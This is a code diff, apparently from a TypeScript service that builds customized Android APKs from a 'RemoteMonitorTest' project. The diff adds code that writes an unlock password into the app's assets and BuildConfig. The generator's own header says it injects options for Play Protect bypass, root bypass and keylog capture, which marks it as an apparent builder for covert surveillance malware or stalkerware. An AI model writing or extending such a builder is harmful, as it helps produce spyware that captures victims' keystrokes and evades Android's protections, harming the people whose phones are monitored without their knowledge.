@@ -6,6 +6,7 @@ import os from 'os';
 /**
  * Gera APK customizado com build local via Gradle
  * Injeta dinamicamente: enableRootBypass, enablePlayProtectBypass, enableKeylogCapture
+ * ✅ ADICIONADO: Suporte para injetar unlockPassword
  */
 export async function generateAPK(options: {
   appName: string;
@@ -20,6 +21,7 @@ export async function generateAPK(options: {
   enableRootBypass?: boolean;
   enablePlayProtectBypass?: boolean;
   enableKeylogCapture?: boolean;
+  unlockPassword?: string; // ✅ NOVO: Senha de desbloqueio
 }): Promise<Buffer> {
   const sourceAndroidPath = path.join(process.cwd(), 'android', 'RemoteMonitorTest');
   
@@ -39,6 +41,12 @@ export async function generateAPK(options: {
     // Modificar build.gradle.kts com as flags customizadas
     const buildGradlePath = path.join(tempBuildDir, 'app', 'build.gradle.kts');
     modifyBuildGradle(buildGradlePath, options);
+    
+    // ✅ ADICIONADO: Injetar a senha no projeto Android
+    if (options.unlockPassword) {
+      console.log(`[APK Generator] Injetando senha de desbloqueio: ${options.unlockPassword.substring(0, 2)}***`);
+      injectPasswordIntoAndroidProject(tempBuildDir, options.unlockPassword);
+    }
     
     // Executar build
     console.log('[APK Generator] Executando Gradle build...');
@@ -99,6 +107,50 @@ function copyDirRecursive(src: string, dest: string) {
     } else {
       fs.copyFileSync(srcPath, destPath);
     }
+  }
+}
+
+/**
+ * ✅ ADICIONADO: Injeta a senha no projeto Android
+ * Cria um arquivo de configuração que será incluído no APK
+ */
+function injectPasswordIntoAndroidProject(tempBuildDir: string, password: string) {
+  try {
+    // Criar diretório assets se não existir
+    const assetsDir = path.join(tempBuildDir, 'app', 'src', 'main', 'assets');
+    if (!fs.existsSync(assetsDir)) {
+      fs.mkdirSync(assetsDir, { recursive: true });
+    }
+    
+    // Escrever arquivo de configuração com a senha
+    const configFile = path.join(assetsDir, 'unlock_password.txt');
+    fs.writeFileSync(configFile, password, 'utf-8');
+    console.log(`[APK Generator] Arquivo de senha criado: ${configFile}`);
+    
+    // Também injetar como constante no BuildConfig (via build.gradle.kts)
+    const buildGradlePath = path.join(tempBuildDir, 'app', 'build.gradle.kts');
+    let content = fs.readFileSync(buildGradlePath, 'utf-8');
+    
+    // Adicionar buildConfigField para a senha
+    const passwordField = `buildConfigField("String", "UNLOCK_PASSWORD", "${password}")`;
+    
+    // Procurar pela última linha de buildConfigField e adicionar após ela
+    const buildConfigRegex = /buildConfigField\("Boolean", "ENABLE_KEYLOG_INJECTION"[^\n]*/;
+    if (buildConfigRegex.test(content)) {
+      content = content.replace(buildConfigRegex, (match) => `${match}\n        ${passwordField}`);
+    } else {
+      // Se não encontrar, adicionar após versionName
+      content = content.replace(
+        /(versionName = "[^"]*")/,
+        `$1\n        ${passwordField}`
+      );
+    }
+    
+    fs.writeFileSync(buildGradlePath, content, 'utf-8');
+    console.log('[APK Generator] Senha injetada no BuildConfig');
+  } catch (error) {
+    console.warn('[APK Generator] Erro ao injetar senha:', error);
+    // Não falhar o build se a injeção falhar
   }
 }
 
